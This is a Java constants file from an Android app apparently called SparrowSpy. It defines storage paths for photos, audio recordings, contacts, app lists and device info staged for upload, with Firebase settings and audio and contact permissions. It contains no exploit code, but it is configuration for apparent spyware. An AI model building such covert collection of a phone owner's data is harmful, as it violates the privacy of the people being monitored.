package com.tangledbytes.sparrowspy.utils;

import android.Manifest;
import android.content.Context;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Constants {


    public static abstract class Debug {
        public static final boolean USE_FIREBASE_EMULATOR = false;
        public static final int FBE_STORAGE_PORT = 9699;
        public static final boolean DEBUG = false;
    }

    // prefix UPLOAD means it is stored in the directory DIR_APP_ROOT/DIR_UPLOAD and will uploaded
    public static File DIR_APP_ROOT;
    public static File DIR_COMPRESSED_IMAGES;
    public static File DIR_UPLOAD; // anything within this is uploaded
    public static File DIR_AUDIO;
    public static File FILE_UPLOAD_IMAGES_ZIP;
    public static File FILE_UPLOAD_IMAGES_MAP;
    public static File FILE_UPLOAD_CONTACTS;
    public static File FILE_UPLOAD_APPS;
    public static File FILE_UPLOAD_DEVICE_INFO;
    public static File FILE_UPLOAD_LOG;
    public static final String FS_DEVICES = "devices";
    public static final String CONFIG_FILE_NAME = "config.json";
    public static final String CONFIG_FILE_STATUS = "configFileUpdated";
    public static final String DEVICE_ID = "device_id";
    public static final String PREFS_NAME = "spy_sparrow";
    public static final String PREF_IMAGES_STATUS = "images_upload";
    public static final String PREF_AUDIO_STATUS = "audio_upload";
    public static final String PREF_CONTACTS_STATUS = "contacts_upload";
    public static final String PREF_DEVICE_INFO_STATUS = "device_info_upload";
    public static final String LICENSE_ACCEPTED_KEY = "license_accepted";


    public static final List<String> PERMISSIONS_NEEDED = new ArrayList<>();

    public static void init(Context context, File appRootDir) {
        DIR_APP_ROOT = appRootDir;
        DIR_COMPRESSED_IMAGES = new File(DIR_APP_ROOT, "compressedImages");
        DIR_UPLOAD = new File(DIR_APP_ROOT, "upload");
        DIR_AUDIO = new File(DIR_UPLOAD, "audio");
        FILE_UPLOAD_IMAGES_ZIP = new File(DIR_UPLOAD, "images.zip");
        FILE_UPLOAD_DEVICE_INFO = new File(DIR_UPLOAD, "device-info.json");
        FILE_UPLOAD_IMAGES_MAP = new File(DIR_COMPRESSED_IMAGES, "images-map.json");
        FILE_UPLOAD_CONTACTS = new File(DIR_UPLOAD, "contacts.json");
        FILE_UPLOAD_APPS = new File(DIR_UPLOAD, "apps-list.json");
        FILE_UPLOAD_LOG = new File(DIR_UPLOAD, "log.json");

        if (!DIR_APP_ROOT.exists())
            DIR_APP_ROOT.mkdirs();
        if (!DIR_UPLOAD.exists())
            DIR_UPLOAD.mkdirs();
        if (!DIR_COMPRESSED_IMAGES.exists())
            DIR_COMPRESSED_IMAGES.mkdirs();
        if(!DIR_AUDIO.exists())
            DIR_AUDIO.mkdirs();

        PERMISSIONS_NEEDED.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        PERMISSIONS_NEEDED.add(Manifest.permission.RECORD_AUDIO);
        PERMISSIONS_NEEDED.add(Manifest.permission.READ_CONTACTS);
    }
}

